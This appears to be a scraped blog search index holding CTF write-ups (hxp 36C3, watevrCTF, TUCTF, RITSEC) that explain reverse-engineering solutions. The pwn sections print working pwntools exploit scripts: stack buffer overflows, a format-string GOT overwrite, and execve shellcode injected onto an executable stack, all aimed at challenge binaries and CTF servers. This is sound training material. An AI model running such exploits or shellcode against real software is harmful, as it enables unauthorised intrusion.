\u0026ldquo;ton_ebyam_ro_galf__flag_or_maybe_not\u0026rdquo;. This has to be because of some code running before main. Heading back to Ghidra, I opened the _INIT_0 and _INIT_1 functions since they run before the entry point is reached. The _INIT_1 function was the required code.\n\r\r\rSo, now after struggling for some time on the input evaluation part, I checked the _FINI_0 and _FINI_1 functions as well, as they run just before the end of the program. The _FINI_1 function had the required code.\n\r\r\rHere we see that the string \u0026ldquo;ton_ebyam_ro_galf__flag_or_maybe_not\u0026rdquo; is XORed with our input string at offset +0x40. This is then compared with alternate elements of the array \u0026amp;DAT_003010a0. The array contents are\n b = [0x1E ,0x00 ,0x1A ,0x00 ,0x00 ,0x00 ,0x36 ,0x00 ,0x0A ,0x00 ,0x10 ,0x00 ,0x54 ,0x00 ,0x00 ,0x00 ,0x01 ,0x00 ,0x33 ,0x00 ,0x17 ,0x00 ,0x1C ,0x00 ,0x00 ,0x00 ,0x09 ,0x00 ,0x14 ,0x00 ,0x1E ,0x00 ,0x39 ,0x00 ,0x34 ,0x00 ,0x2A ,0x00 ,0x05 ,0x00 ,0x04 ,0x00 ,0x04 ,0x00 ,0x09 ,0x00 ,0x3D ,0x00 ,0x03 ,0x00 ,0x17 ,0x00 ,0x3C ,0x00 ,0x05 ,0x00 ,0x3E ,0x00 ,0x14 ,0x00 ,0x03 ,0x00 ,0x03 ,0x00 ,0x36 ,0x00 ,0x0F ,0x00 ,0x4E ,0x00 ,0x55 ,0x00]\n So, all we have to do is XOR the fixed string with the alternate elements of this array and that should give us our flag.\na = \u0026#34;ton_ebyam_ro_galf__flag_or_maybe_not\u0026#34;\rb = [0x1E ,0x00 ,0x1A ,0x00 ,0x00 ,0x00 ,0x36 ,0x00 ,0x0A ,0x00 ,0x10 ,0x00 ,0x54 ,0x00 ,0x00 ,0x00 ,0x01 ,0x00 ,0x33 ,0x00 ,0x17 ,0x00 ,0x1C ,0x00 ,0x00 ,0x00 ,0x09 ,0x00 ,0x14 ,0x00 ,0x1E ,0x00 ,0x39 ,0x00 ,0x34 ,0x00 ,0x2A ,0x00 ,0x05 ,0x00 ,0x04 ,0x00 ,0x04 ,0x00 ,0x09 ,0x00 ,0x3D ,0x00 ,0x03 ,0x00 ,0x17 ,0x00 ,0x3C ,0x00 ,0x05 ,0x00 ,0x3E ,0x00 ,0x14 ,0x00 ,0x03 ,0x00 ,0x03 ,0x00 ,0x36 ,0x00 ,0x0F ,0x00 ,0x4E ,0x00 ,0x55 ,0x00]\rflag = \u0026#39;\u0026#39;\rb = b[::2]\rfor i in range(len(b)):\rflag += chr(b[i] ^ ord(a[i]))\rprint(flag)\r# \u0026#39;junior-alles_nur_kuchenblech_mafia!!\u0026#39;\r The flag is - junior-alles_nur_kuchenblech_mafia!!\n I had great fun solving this CTF. Learnt a ton! This was my last CTF and blog post for 2019.\n2020 will see a lot more blog posts, writeups and some interesting security research too. Till then, sayonara.\n\rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1577608606,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1577608606,"objectID":"05a83b54380af9b8725185ab0603df1c","permalink":"https://shreyansh26.github.io/post/2019-12-30_hxp-36c3-ctf/","publishdate":"2019-12-29T14:06:46+05:30","relpermalink":"/post/2019-12-30_hxp-36c3-ctf/","section":"post","summary":"The hxp CTF happens every year along with the Chaos Communication Congress (a top security conference). This year was the 36th edition. This CTF is a major CTF, you know this when the CTF has a rating weight of 63.0 on CTFTime. Also, it is one of the qualifier events of DEFCON 2020 CTF.\nI was playing solo on this one and gave one day to this CTF. I managed to solve 2 problems in the main CTF and 2 in the Junior CTF.","tags":["rev","wasm","android","misc","36C3","information security","infosec","writeups"],"title":"hxp 36C3 CTF Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.\n Rev Challeneges Timeout File: timeout\nThe binary is unstripped, so we can easily see the main function. The disassembly looks something like this.\n\r\r\rThe functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time. We nop those out. So that our disassembly looks like this now.\n\r\r\rWe see that there is a flag can_continnue which is set to 0x539, but not used in the code again. Checking the functions, we find one as generate, which uses this variable and generates the flag. Now solving this is simple using a debugger. Set a breakpoint before exiting and transfer execution to this function, using set $rip = 0x4006a6.\nWe get the flag - watevr{3ncrytion_is_overrated_youtube.com/watch?v=OPf0YbXqDm0}\n Hacking For Vodka File: vodka\nThe binary has different functionalities when run normally and when run in a debugger. We know this because of the ptrace call.\n\r\r\rI decide to analyse just the part which would have been evaded we were to run in a debugger, i.e the FUN_001012bf function. Inside that, there are a few more fuction calls and variables are set on stack. The intersesting part is the FUN_0010092a function.\nInside that function, which looks very complicated, there is an fgets call which is used to get our input and a strcmp to validate the input.\n\r\r\rAlso, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag :stuck_out_tongue:.\nPS - Before the dynamic analysis, we patch the PTRACE_TRACEME call to jump to the required function.\nThe flag is - watevr{th4nk5_h4ck1ng_for_s0ju_hackingforsoju.team}\n esreveR File: esrever\nThis was a very fun challenge. When we open the binary, we see that the main function is heavily obfuscated. Not obfuscated in the true sense, but a lot is going on. For those using Ghidra, FUN_001018f3 is the main function. We see a lot of variables and a whole lot of precomputation. It is as late as in the 174th line that there is an fgets call to take our input.\n\r\r\rSo, I set breakpoints at various places, to check what all is being computed. It is interesting that our input is used quite late in the code. It is used as a parameter to FUN_001012d8, which looks like something which will validate our input.\nOn checking that function, there is a call to another function FUN_00100ba0 with a large number of parameters, formed by basic bit manipulations (using XOR) with the precomputed values. Our input string is also sent with it. Then we check this function FUN_00100ba0. It has 57 parameters. And in this we see that our input is checked each of the remaining 56 parameters character wise. So, basically the 56 parameters is our flag.\nAgain, dynamic analysis was key here.\n\r\r\rBefore the function call, the parameters are pushed onto the stack. We read these values by printing a larger number of values form $ebp-0x10.\nTha flag was - watevr{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}\n watshell File: watshell\nIn this problem, we have to send an input to the service, which will be decrypted, checked against a fixed string - \u0026ldquo;give_me_the_flag_please\u0026rdquo;, and only then do we get the flag.\nSo, I started at the main function FUN_0010178b. Again like, the first problem, Timeout, there are a few inital timeout checks, which I patched. There is some precomputation being done before we enter our input.\n\r\r\rstrtok is used here, which is used to split the string at some delimiter. And also, atol is used to convert each such substring to a number. The delimiter here is 0x20, i.e. a space. So we have to supply our input \u0026ldquo;command\u0026rdquo; as space separated numbers.\nWe use dynamic analysis after we give our input, since all the precomputations are done, we don\u0026rsquo;t have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of 10 11 12 13 14 15 16, the following parameters are passed -\n0x5555555551af (\r$rdi = 0x00007fffffffd370 → 0x000000000000000a,\r$rsi = 0x0000000000000040,\r$rdx = 0x0000000000000000,\r$rcx = 0x00007fffffffd350 → 0x000000000000008f\r)\ri.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array\u0026rsquo;s pointer, with the first element as 0x8f.\nNow I analysed FUN_001011af, it has two malloc calls to get the buffer to store the decrypted string. After some basic checks, there is a call to FUN_00100dc3.\n\r\r\rThe parameters passed are -\n0x555555554dc3 (\r$rdi = 0x000000000000000a, // inp\r$rsi = 0x0000000000000071, // arr_ele2\r$rdx = 0x000000000000008f, // arr_ele1\r$rcx = 0x0000000000000071\r)\ri.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.\nThis function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.\n#include \u0026lt;bits/stdc++.h\u0026gt;\r\rusing namespace std;\rlong func(long inp, ulong arr_ele2, long mod) {\rlong lVar1;\rif (((-1 \u0026lt; inp) \u0026amp;\u0026amp; (-1 \u0026lt; (long)arr_ele2)) \u0026amp;\u0026amp; (0 \u0026lt; mod)) {\rinp = inp % mod;\rif (arr_ele2 == 0) {\rlVar1 = 1;\r}\relse {\rlVar1 = inp;\rif (arr_ele2 != 1) {\rif ((arr_ele2 \u0026amp; 1) == 0) {\rlVar1 = (inp * inp) % mod;\rlVar1 = func(lVar1,(long)arr_ele2 / 2,mod);\rlVar1 = lVar1 % mod;\r}\relse {\rlVar1 = (long)((int)arr_ele2 - (int)((long)arr_ele2 \u0026gt;\u0026gt; 0x3f) \u0026amp; 1) + ((long)arr_ele2 \u0026gt;\u0026gt; 0x3f);\rif (lVar1 == 1) {\rlVar1 = func(inp,arr_ele2 - 1,mod);\rlVar1 = (lVar1 * inp) % mod;\r}\r}\r}\r}\rreturn lVar1;\r}\r/* WARNING: Subroutine does not return */\rexit(1);\r}\rint main() {\rmap\u0026lt;int, int\u0026gt; m;\rfor(int i=0; i\u0026lt;100000; i++) {\rlong ans = func(i, 0x71, 0x8f);\rif(m.find((int)ans) == m.end())\rm[(int)ans] = i;\r}\rfor(auto i: m) {\rcout\u0026lt;\u0026lt;i.first\u0026lt;\u0026lt;\u0026#34;: \u0026#34;\u0026lt;\u0026lt;i.second\u0026lt;\u0026lt;endl;\r}\rstring s = \u0026#34;give_me_the_flag_please\u0026#34;;\rfor(char c: s) {\rcout\u0026lt;\u0026lt;m[c]\u0026lt;\u0026lt;\u0026#34; \u0026#34;;\r}\rcout\u0026lt;\u0026lt;endl;\rreturn 0;\r}\rNow, what remains is to get the enoced values corresponding to \u0026ldquo;give_me_the_flag_please\u0026rdquo;. The most thing dut to which I was stuck for some time was to add the encoding for the NULL character at the end as well (here it was 0). So final input is - 38 118 79 95 127 109 95 127 129 91 95 127 20 114 15 38 127 73 114 95 15 124 95 0.\nThe flag is - watevr{oops_1_f0rg0t_to_use_r4ndom_k3ys!_youtube.com/watch?v=BaACrT6Ydik}\n  Pwn Challenges Voting Machine 1 File: kamikaze\nThis is a buffer overflow challenge as gets has been used. There is a function super_secret_function. We basically have to jump there as it prints the flag. Pretty straightforward.\n\r\r\rThe offset of the crash is calculated using gef\u0026rsquo;s pattern create and pattern search functionality.\nMy exploit code -\nfrom pwn import *\r# context.log_level = \u0026#39;debug\u0026#39;\r p = process(\u0026#34;./kamikaze\u0026#34;)\re = ELF(\u0026#39;./kamikaze\u0026#39;)\rp = remote(\u0026#34;13.48.67.196\u0026#34;, 50000)\roffset = 10\rp.recvuntil(\u0026#39;: \u0026#39;)\rfunc = 0x0000000000400807\rpayload = \u0026#34;A\u0026#34;*offset\rpayload += p64(func)\rp.sendline(payload)\rwith open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) as f:\rf.write(payload)\rp.interactive()\rThe flag is - watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_https://www.youtube.com/watch?v=Va4aF6rRdqU}\n Voting Machine 2 File: kamikaze2\nThis binary had a format string vulnerability, since printf is being used without any format specifiers.\n\r\r\rI played around with the input for a while, realised that there was an alignment issue (of 2), when trying to get my input onto the stack variables. After this, we can see our input string at the 8th output (stack output due to format string bug) when supplied with %xs. The objective here is to replace the exit call at the end of main (FUN_084207fb) with a function that reads the flag (FUN_08420736).\nAfter this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.\nThe final exploit code is -\nfrom pwn import *\r# context.log_level = \u0026#39;debug\u0026#39;\r p = process(\u0026#34;./kamikaze2\u0026#34;)\rp = remote(\u0026#34;13.53.125.206\u0026#34;, 50000)\roffset = 50\rfunc = 0x08420736\rmain = 0x084207fb\rexit_plt = 0x08422024\rdef pad(s):\rreturn s+\u0026#34;X\u0026#34;*(offset-len(s))\rexploit = \u0026#34;\u0026#34;\rexploit += \u0026#34;AA\u0026#34;\rexploit += p32(exit_plt)\rexploit += p32(exit_plt+2)\rexploit += \u0026#34;BBBBCCCC\u0026#34;\rexploit += \u0026#34;%8$1828x\u0026#34;\rexploit += \u0026#34;%8$n\u0026#34;\rexploit += \u0026#34;%65804x\u0026#34;\rexploit += \u0026#34;%9$n\u0026#34;\rprint(pad(exploit))\rpayload = pad(exploit)\rp.recvuntil(\u0026#39;: \u0026#39;)\rp.sendline(payload)\rwith open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) as f:\rf.write(pad(exploit))\rp.interactive()\rThe flag is - watevr{GOT_som3_fl4g_for_you_https://www.youtube.com/watch?v=hYeFcSq7Mxg}\n Other categories Misc - Unspaellablle File: orig.txt\nWe are given a script for an episode of CHILDREN OF THE GODS by Jonathan Glassner \u0026amp; Brad Wright. Initially I had no clue how to proceed, but then I googled this episode and specifically for its transcript.\nI found it at IMSDb, and it was in the same format!!!\nAfter this it was just a matter of diffing using vimdiff to get the changed characters which was oir flag.\n\r\r\rThe flag is - watevr{icantspeel_tiny.cc/2qtdez}\n Web - Cookie Store Webpage - http://13.48.71.231:50000/\nThe page has a cookie - eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==, on decoding - {\u0026ldquo;money\u0026rdquo;: 50, \u0026ldquo;history\u0026rdquo;: []}.\nWe see that the Flag cookie is for 100$, so if we set the cookie to base64({\u0026ldquo;money\u0026rdquo;: 200, \u0026ldquo;history\u0026rdquo;: []}), i.e. eyJtb25leSI6IDIwMCwgImhpc3RvcnkiOiBbXX0=. With this our balance gets updated. Now we can buy the flag cookie and get the flag.\nThe flag is - watevr{b64_15_4_6r347_3ncryp710n_m37h0d}\n That\u0026rsquo;s all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn\u0026rsquo;t solve. I will add my version of their writeups when I get to know their solution.\n\rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1576390446,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1576390446,"objectID":"7254807c17fe62c2cb5e6fbfa91ffffe","permalink":"https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/","publishdate":"2019-12-15T11:44:06+05:30","relpermalink":"/post/2019-12-15_watevr-ctf-2019-writeups/","section":"post","summary":"This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.\n Rev Challeneges Timeout File: timeout\nThe binary is unstripped, so we can easily see the main function. The disassembly looks something like this.\n\r\r\rThe functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time.","tags":["rev","pwn","misc","ctf","information security","infosec","writeups"],"title":"watevrCTF 2019 Writeups (Mainly Rev and Pwn)","type":"post"},{"authors":null,"categories":["Information Security"],"content":"I couldn\u0026rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.\n Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.\n\r\r\rDisassembly of main\r\r\rThis can be done using pattern create 50 and then using that pattern to find the crash offset.\n\r\r\r\r\r\rAlso inspecting the functions, we see that there is a printFlag function at 0x80491f6. So, our objective is to jump there.\nThe following script is the exploit.\nfrom pwn import *\rp = process(\u0026#34;./thefirst\u0026#34;)\r# p = remote(\u0026#34;chal.tuctf.com\u0026#34;, 30508)\r print_flag_addr = 0x80491f6\roffset = 20\rpayload = \u0026#34;A\u0026#34;*offset\rpayload += \u0026#34;BBBB\u0026#34;\rpayload += p32(print_flag_addr)\rf = open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;)\rf.write(payload)\rf.close()\rp.recvuntil(\u0026#39;\u0026gt; \u0026#39;)\rp.sendline(payload)\rp.interactive()\r shellme32 - 462 pts On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using vmmap, we find that the adress given to us is that of the stack and the stack is read, write and executable.\n\r\r\rWe use shell-storm to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with \u0026lsquo;A\u0026rsquo;s and then provide the address to write to, i.e. the adress provided to us.\nshellcode = \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#34;\rlen_shell_code = 28\rfrom pwn import *\r# context.log_level = \u0026#39;debug\u0026#39;\r p = process(\u0026#34;./shellme32\u0026#34;)\roffset = 40\rp.recvuntil(\u0026#39;?\\n\u0026#39;)\raddr = int(p.recvline().strip(), 16)\rp.recvuntil(\u0026#39;\u0026gt; \u0026#39;)\rlog.info(\u0026#39;Stack Address: \u0026#39; + str(hex(addr)))\rpayload = shellcode\rpayload += \u0026#34;A\u0026#34;*(offset - len_shell_code)\rpayload += p32(addr)\rprint(len(shellcode))\rp.sendline(payload)\rwith open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) as f:\rf.write(payload)\rp.interactive()\r shellme64 - 480 pts This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And replace p32 with p64 when adding the stack address to the payload.\nWe use exploit-db to get the shellcode. The offset of the crash is same as before.\nshellcode = \u0026#34;\\x50\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05\u0026#34;\rlen_shell_code = 24\rfrom pwn import *\r# context.log_level = \u0026#39;debug\u0026#39;\r p = process(\u0026#34;./shellme64\u0026#34;)\roffset = 40\rp.recvuntil(\u0026#39;this\\n\u0026#39;)\raddr = int(p.recvline().strip(), 16)\rp.recvuntil(\u0026#39;\u0026gt; \u0026#39;)\rlog.info(\u0026#39;Stack Address: \u0026#39; + str(hex(addr)))\rpayload = shellcode\rpayload += \u0026#34;A\u0026#34;*(offset - len(shellcode))\r# with open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) as f:\r # f.write(payload)\r payload += p64(addr)\rp.sendline(payload)\rwith open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) as f:\rf.write(payload)\rp.interactive()\r printfun - 500 pts Here, on analysing with Ghidra, we find that there is a format string vulnerability.\n\r\r\rSo, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide \u0026quot;%x %x %x %x %x %x %x %x %x %x %x %x %x %x\u0026quot;, for the instance running on GDB we get this output -\n5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0\nOn seeing the values displayed by GDB, we see two addresses - 0x5655a008 and 0x5655a050\n\r\r\rThis is intereting as both these addresses are also present in the program\u0026rsquo;s output with our input.\nSo, all we have to do is overwrite the 6th and 7th \u0026ldquo;addresses\u0026rdquo; of the output to the same value so that the string comparison passes.\nWe write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -\nfrom pwn import *\rp = process(\u0026#34;printfun\u0026#34;)\rpayload = \u0026#34;AAAA%6$n%7$n\u0026#34;\rp.sendlineafter(\u0026#39;? \u0026#39;, payload)\rp.interactive()\r Rev Challenges faker - 400 pts If we open the binary in Ghidra, we see that there are calls to different functions, namely A, B and C, which depend on the user input. But on trying them, we get fake flags.\n\r\r\rBut all of them have a common structure, they have a call to printFlag with a string.\n\r\r\rAlso in the functions list, we see that there is a function named thisone. First we take a look at printFlag function.\n\r\r\rThere can be two ways to solve this challenge.\nMethod 1 - Static Write a script to emulate the functionality of the printFlag function.\ndef printFlag(s):\rs2 = \u0026#34;\u0026#34;\rfor i in range(len(s)):\rx = ((((ord(s[i]) ^ 0xf) - 0x1d) * 8) % 0x5f) + 0x20\rs2 += chr(x)\rprint(s2)\rprintFlag(\u0026#34;\\\\PJ\\\\fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k\u0026#34;)\rThis gives us the flag - TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}\nMethod 2 - Dynamic Here set a breakpoint in main and then run the following commads in GDB.\n(gdb) info functions # get address of printFlag function\r(gdb) set $rip=0x000055555555534b # i.e. to the address of the function\r(gdb) c\rThis will print the flag.\n core - 400 pts We a re provided a core dump and a C file. The C file looks like this\n#include \u0026lt;stdio.h\u0026gt; // prints\r#include \u0026lt;stdlib.h\u0026gt; // malloc\r#include \u0026lt;string.h\u0026gt; // strcmp\r#include \u0026lt;unistd.h\u0026gt; // read\r#include \u0026lt;fcntl.h\u0026gt; // open\r#include \u0026lt;unistd.h\u0026gt; // close\r#include \u0026lt;time.h\u0026gt; // time\r\r#define FLAG_LEN 64\rchar flag[FLAG_LEN];\rvoid xor(char *str, int len) {\rfor (int i = 0; i \u0026lt; len; i++) {\rstr[i] = str[i] ^ 1;\r}\r}\rint main() {\rsetvbuf(stdout, NULL, _IONBF, 20);\rsetvbuf(stdin, NULL, _IONBF, 20);\r// Read the flag\r\tmemset(flag, 0, FLAG_LEN);\rprintf(\u0026#34;\u0026gt; \u0026#34;);\rint len = read(0, flag, FLAG_LEN);\rxor(flag, len);\rchar buf[32];\rread(0, buf, 128);\rreturn 0;\r}\rBasically we are XORing the input string with 1. We assume that flag is in the standard format, i.e. begins with TUCTF. So we pre-calculate, the starting of the string that should be in memory.\nTUCTF =\u0026gt; UTBUG\nWe use xxd to view the core.\n\r\r\rWe find something interesting in the memory. On decoding\ncore_string = \u0026#34;55544255477a623173325e65746c713e5e4f327732735e69323573655e31675e7831747c\u0026#34;.decode(\u0026#39;hex\u0026#39;)\rflag = \u0026#34;\u0026#34;\rfor i in core_string:\rflag += chr(ord(i) ^ 1)\rprint(flag)\rThe flag - TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}\n That\u0026rsquo;s all for now :wave:.\n","date":1575295797,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575554997,"objectID":"e9f0a95959ab730e76b5bef200fe2fc9","permalink":"https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/","publishdate":"2019-12-02T19:39:57+05:30","relpermalink":"/post/2019-12-02_tuctf-pwn-2019/","section":"post","summary":"I couldn\u0026rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.\n Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow.","tags":["rev","pwn","ctf","information security","infosec","writeups"],"title":"TUCTF 2019 - Pwn \u0026 Rev Challenges","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"Details coming soon!\n","date":1574684613,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1574684613,"objectID":"a046b443526d57a08981cc321ade8d76","permalink":"https://shreyansh26.github.io/project/privacy-ml/","publishdate":"2019-11-25T17:53:33+05:30","relpermalink":"/project/privacy-ml/","section":"project","summary":"Perform medical image classification in a secure and privacy-preserving manner using Secure Multiparty Computation and Differntial Privacy","tags":["information security","deep learning","secure multi-party computation","differential privacy","image classification"],"title":"Privacy-preserving Machine Learning using Secure Multiparty Computation","type":"project"},{"authors":null,"categories":["Information Security"],"content":"A bit late for writeups, but still here are the solutions to the challenges I solved during the CTF. The CTF was from 15 Nov. 2019, 22:30 IST — Mon, 18 Nov. 2019, 10:30 IST. It was a decent CTF with quality challenges, from both beginner to advanced level.\nUpdate: The scripts to solve and the flags are present in this repo.\nI\u0026rsquo;ll do the writeups category-wise -\n Crypto  pre-legend — 100 pts\n9EEADi^⁸:E9F3]4@\u0026amp;gt;⁴=2J32==^D@\u0026amp;gt;6E9:?8\\FD67F=\\C:ED64\nThis is the provided cipher text. Since all of these are ASCII characters, we try a ROT of till say, 50.\n On i=47, we get — https\\x98\\x8d\\x8dgithub\\x8ccom\\x8dclayball\\x8dsomething\\x8buseful\\x8britsec\nThere is a problem with the special characters, but we understand that is a GitHub repo, with the URL (after some testing) — https://github.com/clayball/something-useful-ritsec.\nAlthough there is nothing flag related in the repo, but the discord group of the CTF said that the link itself is the flag.\nFlag —RITSEC{https://github.com/clayball/something-useful-ritsec}\n Shiny — 100 pts\nWe are given the following text, and an image .‡8]5);483‡5;\n\r\r\rgold-bug.jfif\r\r\rThis did not hit me directly, so I had to do a bit of Googling. I found that this is a reference to a short story by Edgar Allan Poe, called The Gold Bug which involves a substitution cipher. I found an online tool for the same.\nThis gives us the flag —RITSEC{POEWASTHEGOAT}\n random — 290 pts\nAfter connecting to nc ctfchallenges.ritsec.club 8001 we find that we are presented with a series of numbers and we have to guess the next. The challenge title tells us that we have something to do with the random function in the C language, because of the hint,\n Are you starting to \u0026lsquo;C\u0026rsquo; a pattern?\n We make a guess that whenever we request that host and port, the random function is initialized with a certain seed and we are given the first five random numbers generated from that seed. So, I wrote a simple C code to bruteforce all unix timestamps from 15th Nov 2019, 00:00 UTC to 17th Nov. 2019 00:00 UTC, and check for the seed. The code is shown below —\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r\rint main() {\rint start = 1573776000; // 15th Nov 2019, 00:00 UTC\r int end = 1573948800; // // 17th Nov 2019, 00:00 UTC\r for(int i=start; i\u0026lt;end; i++) {\rsrand(i);\rint a = rand();\rint b = rand();\rint c = rand();\rint d = rand();\rint e = rand();\rint f = rand();\rif(a==1068399227 \u0026amp;\u0026amp; b==161933545 \u0026amp;\u0026amp; c==741438783 \u0026amp;\u0026amp; d==1951874661 \u0026amp;\u0026amp; e==1076387813) {\rprintf(\u0026#34;Seed: %d\\n\u0026#34;, i);\rprintf(\u0026#34;Next: %d\\n\u0026#34;, f);\rbreak;\r}\r}\rreturn 0;\r}\rWe provide the next number, and get the flag — RITSEC{404_RANDOMNESS_NOT_FOUND}\n Misc  Crack me If You Can — 391 pts\nIn this challenge, after connecting to nc ctfchallenges.ritsec.club 8080, we find that we are presented with queries of hashes, and we have to break them in order to get the flag. They were NTLM and sha256 hashes. So, we used a combination of crackstation.net and John the Ripper to crack both of them.\nWe found the flag — RS{H@$HM31FY0UCAN}\n Onion Layer Encoding — 100 pts\nThe challenge says that the text is encoded using either Base16 or Baser32 or Base64 in a sequence. So we write a simple python script to solve it.\nimport base64\rflag = open(\u0026#34;onionlayerencoding.txt\u0026#34;,\u0026#34;r\u0026#34;).read()\rwhile \u0026#34;RITSEC\u0026#34; not in str(flag):\rtry:\rflag = base64.b16decode(flag)\rexcept:\rtry:\rflag = base64.b32decode(flag)\rexcept:\rflag = base64.b64decode(flag)\rprint(flag)\rThe flag is — RITSEC{0n1On_L4y3R}\n AlPhAbEtIcAl Challenge - 100pts\nI couldn\u0026rsquo;t solve this during the CTF, but saw other writeups and found that it was actually pretty interesting. The cipher text that is provided is —\n 59:87:57:51:85:80{:40:50:56:08:82:58:81:08:18:85:57:87:48:85:88:40:50:56:59:15:56:11:18:85:59:51:}\n We see that the \u0026lsquo;{\u0026rsquo; and \u0026lsquo;}\u0026rsquo; are in place. So, this must represent the flag. The other numbers are assigned some alphabet starting from \u0026lsquo;A\u0026rsquo;. After this we see that we have the following — ABCDEF{GHIJKLMJNECBOEPGHIAQIRNEAD}.\nOn this we use an online substitution solver like quipquip.com and also the fact that ABCDEF corresponds 